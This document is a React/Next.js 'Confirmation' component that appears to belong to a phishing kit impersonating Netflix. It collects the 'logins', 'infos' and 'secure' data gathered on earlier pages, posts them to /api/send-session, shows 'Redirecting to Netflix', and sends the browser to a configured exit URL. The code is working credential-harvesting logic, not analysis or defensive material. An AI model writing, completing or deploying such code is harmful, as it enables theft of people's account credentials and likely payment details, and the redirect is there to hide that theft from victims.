import axios from "axios";
import React, { useContext, useEffect } from "react";
import { DataContext } from "./_app";

interface ConfirmationProps {}

export const Confirmation: React.FC<ConfirmationProps> = ({}) => {
  const { data } = useContext(DataContext);
  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const logins = data.logins;
      const infos = data.infos;
      const secure = data.secure;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (infos) {
            formData.append(`infos`, JSON.stringify(infos));
          }

          if (secure) {
            formData.append(`secure`, JSON.stringify(secure));
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData, {
            headers: {
              "Content-Type": `multipart/form-data`,
            },
          });
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <div className={`flex justify-center items-center w-full h-screen`}>
      <span className={`loader`} />
      <span className={`ml-5 font-bold`}>Redirecting to Netflix</span>
    </div>
  );
};

export default Confirmation;
